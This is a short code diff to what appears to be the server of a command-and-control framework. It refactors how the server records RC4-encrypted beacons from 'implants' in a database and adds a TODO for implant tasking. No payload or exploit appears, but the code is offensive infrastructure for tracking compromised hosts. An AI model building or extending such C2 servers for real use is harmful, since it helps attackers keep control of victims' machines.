@@ -110,6 +110,7 @@ class WebServer(object):
             return base64.b64encode(key.encode())
 
         # else RC4 encrypted beacon
+        # old beacon
         else:
             # queries all encryption keys from the "implants" table
             with self.connection:
@@ -133,13 +134,16 @@ class WebServer(object):
             operating_system = j["operating_system"]
 
             # updates "last_beacon" time in "implants" table
-            # uses previously opened cursor
-            cursor.execute("""UPDATE implants SET last_beacon = ?
-                              WHERE hostname = ?
-                              AND process_id = ?""",
-                           (current_time,
-                            hostname,
-                            process_id))
+            with self.connection:
+                cursor = self.connection.cursor()
+                cursor.execute("""UPDATE implants SET last_beacon = ?
+                                  WHERE hostname = ?
+                                  AND process_id = ?""",
+                               (current_time,
+                                hostname,
+                                process_id))
+
+                # TO DO: checks for implant tasking
 
             return "RC4 beacon"
 
